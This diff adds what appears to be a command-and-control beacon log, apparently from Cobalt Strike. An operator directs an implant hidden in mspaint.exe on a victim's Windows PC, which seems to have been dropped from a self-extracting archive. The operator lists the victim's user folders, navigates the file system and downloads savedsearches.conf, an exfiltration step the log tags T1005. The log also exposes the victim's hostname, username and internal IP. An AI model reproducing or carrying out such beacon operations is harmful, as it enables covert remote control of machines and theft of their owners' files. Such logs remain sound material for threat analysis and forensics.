@@ -1,0 +1,114 @@
+01/03 09:27:02 UTC [metadata] 172.22.221.140 <- 172.22.221.140; computer: DESKTOP-B0D0J2Q; user: ANH KHOA; process: mspaint.exe; pid: 4272; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+01/03 09:27:04 UTC [input] <neo> ls
+01/03 09:27:04 UTC [task] <> Tasked beacon to list files in .
+01/03 09:27:58 UTC [checkin] host called home, sent: 19 bytes
+01/03 09:27:58 UTC [output]
+C:\Users\ADMIN\AppData\Local\Temp\RarSFX3\*
+D	0	01/03/2023 16:25:27	.
+D	0	01/03/2023 16:25:27	..
+F	954368	01/03/2023 15:54:03	a.exe
+F	2319	12/21/2022 17:16:19	chrome.lnk
+F	2319	12/21/2022 17:16:19	Google Chrome.lnk
+
+
+01/03 09:28:01 UTC [input] <neo> cd ..
+01/03 09:28:01 UTC [task] <> cd ..
+01/03 09:28:58 UTC [checkin] host called home, sent: 10 bytes
+01/03 09:29:00 UTC [input] <neo> cd ..
+01/03 09:29:00 UTC [task] <> cd ..
+01/03 09:29:01 UTC [input] <neo> cd ..
+01/03 09:29:01 UTC [task] <> cd ..
+01/03 09:29:02 UTC [input] <neo> cd ..
+01/03 09:29:02 UTC [task] <> cd ..
+01/03 09:29:07 UTC [input] <neo> pwd
+01/03 09:29:07 UTC [task] <> Tasked beacon to print working directory
+01/03 09:29:58 UTC [checkin] host called home, sent: 38 bytes
+01/03 09:29:58 UTC [output]
+Current directory is C:\Users\ADMIN
+
+01/03 09:30:20 UTC [input] <neo> ls
+01/03 09:30:20 UTC [task] <> Tasked beacon to list files in .
+01/03 09:30:58 UTC [checkin] host called home, sent: 19 bytes
+01/03 09:30:58 UTC [output]
+C:\Users\ADMIN\*
+D	0	12/29/2022 01:10:50	.
+D	0	12/29/2022 01:10:50	..
+D	0	10/23/2022 22:05:09	.android
+D	0	10/29/2022 23:20:26	.cache
+D	0	10/02/2022 11:04:58	.docker
+D	0	09/29/2022 22:48:58	.dotnet
+D	0	10/29/2022 23:20:25	.eclipse
+D	0	09/03/2022 09:39:44	.Ld9VirtualBox
+D	0	10/30/2022 00:39:47	.p2
+F	512	12/22/2022 15:17:34	.packettracer
+F	218	08/12/2022 21:24:18	.recently-used.xbel
+D	0	09/29/2022 22:51:41	.templateengine
+F	528	10/03/2022 21:57:56	.vivaldi_reporting_data
+D	0	08/01/2022 16:55:14	.vscode
+D	0	08/01/2022 01:16:04	3D Objects
+D	0	07/30/2022 17:29:32	ansel
+D	0	08/01/2022 01:12:52	AppData
+D	0	08/01/2022 01:12:43	Application Data
+D	0	12/22/2022 15:18:06	Cisco Packet Tracer 8.2.0
+D	0	08/01/2022 01:16:04	Contacts
+D	0	08/01/2022 01:12:43	Cookies
+D	0	01/02/2023 22:59:38	Desktop
+D	0	11/30/2022 13:42:45	Documents
+D	0	01/03/2023 16:02:43	Downloads
+D	0	12/06/2022 10:50:00	Dropbox
+D	0	10/29/2022 23:16:44	eclipse
+D	0	08/01/2022 01:16:04	Favorites
+D	0	07/30/2022 21:40:00	Intel
+D	0	08/15/2022 15:00:35	IntelGraphicsProfiles
+D	0	08/01/2022 01:16:04	Links
+D	0	08/01/2022 01:12:43	Local Settings
+D	0	07/30/2022 19:20:54	MicrosoftEdgeBackups
+F	227	10/01/2022 21:13:24	MouseCheck.ps1
+D	0	08/01/2022 01:16:04	Music
+D	0	08/01/2022 01:12:43	My Documents
+D	0	08/01/2022 01:12:43	NetHood
+F	16777216	12/31/2022 18:55:23	NTUSER.DAT
+F	4059136	08/01/2022 01:12:43	ntuser.dat.LOG1
+F	786432	08/01/2022 01:12:43	ntuser.dat.LOG2
+F	65536	08/01/2022 01:12:43	NTUSER.DAT{3332d0c1-10fc-11ed-adcb-a750c78c57d7}.TM.blf
+F	524288	08/01/2022 01:12:43	NTUSER.DAT{3332d0c1-10fc-11ed-adcb-a750c78c57d7}.TMContainer00000000000000000001.regtrans-ms
+F	524288	08/01/2022 01:12:43	NTUSER.DAT{3332d0c1-10fc-11ed-adcb-a750c78c57d7}.TMContainer00000000000000000002.regtrans-ms
+F	20	08/01/2022 01:15:59	ntuser.ini
+D	0	12/15/2022 20:27:30	OneDrive
+D	0	08/01/2022 01:16:04	Pictures
+D	0	08/01/2022 01:12:43	PrintHood
+D	0	08/01/2022 01:12:43	Recent
+D	0	08/01/2022 01:16:04	Saved Games
+F	162932	12/29/2022 01:11:01	savedsearches.conf
+D	0	08/01/2022 01:16:04	Searches
+D	0	08/01/2022 01:12:43	SendTo
+D	0	09/20/2022 09:21:00	source
+D	0	08/01/2022 01:12:43	Start Menu
+D	0	08/01/2022 01:12:43	Templates
+D	0	11/22/2022 22:54:47	Videos
+
+
+01/03 09:31:28 UTC [input] <neo> download savedsearches.conf
+01/03 09:31:28 UTC [task] <T1005> Tasked beacon to download savedsearches.conf
+01/03 09:31:58 UTC [checkin] host called home, sent: 26 bytes
+01/03 09:31:58 UTC [output]
+started download of C:\Users\ADMIN\savedsearches.conf (162932 bytes)
+
+01/03 09:31:58 UTC [output]
+download of savedsearches.conf is complete
+
+01/03 09:32:34 UTC [input] <neo> cd ..
+01/03 09:32:34 UTC [task] <> cd ..
+01/03 09:32:53 UTC [input] <neo> cd ..
+01/03 09:32:53 UTC [task] <> cd ..
+01/03 09:32:58 UTC [checkin] host called home, sent: 20 bytes
+01/03 09:33:02 UTC [input] <neo> pwd
+01/03 09:33:02 UTC [task] <> Tasked beacon to print working directory
+01/03 09:33:58 UTC [checkin] host called home, sent: 8 bytes
+01/03 09:33:58 UTC [output]
+Current directory is C:\
+
+01/03 09:34:30 UTC [input] <neo> cd ..
+01/03 09:34:30 UTC [task] <> cd ..
+01/03 09:34:31 UTC [input] <neo> ls
+01/03 09:34:31 UTC [task] <> Tasked beacon to list files in .
